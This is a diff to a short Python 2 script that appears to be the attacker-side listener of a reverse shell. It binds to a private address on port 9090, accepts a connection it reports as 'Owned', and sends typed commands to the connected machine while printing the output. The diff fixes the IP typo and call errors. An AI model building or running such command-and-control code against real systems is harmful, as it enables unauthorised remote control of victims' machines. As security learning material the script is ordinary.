@@ -1,12 +1,13 @@
 import socket #For build TCP connections
 
 def connect():
+
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(("10.10..10.100", 9090))
+    s.bind(("10.10.10.100", 9090))
     s.listen(1)
+    print '[+] Listening for incoming TCP connection on port 9090'
     conn, addr = s.accept()
     print '[+] Owned a connection from: ', addr
-
 
     while True:
 
@@ -19,8 +20,9 @@ def connect():
 
         else:
             conn.send(command)
-            print.recv(1024)
+            print conn.recv(1024)
 
-def main():
-    connect
+def main ():
+    connect()
 main()
+    
